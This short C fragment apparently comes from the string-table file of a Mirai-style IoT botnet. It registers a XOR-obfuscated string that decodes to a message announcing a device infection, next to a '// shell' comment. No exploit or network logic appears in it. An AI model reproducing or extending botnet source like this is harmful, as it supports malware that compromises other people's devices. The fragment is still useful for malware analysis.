...
void table_init(void)
{
    ...
    add_entry(TABLE_EXEC_SUCCESS, "\x06\x2C\x24\x65\x14\x27\x2A\x31\x65\x0D\x24\x36\x65\x0C\x2B\x23\x20\x26\x31\x20\x21\x65\x11\x2D\x2C\x36\x65\x01\x20\x33\x2C\x26\x20\x65\x7E\x6C\x45", 37);
    // shell
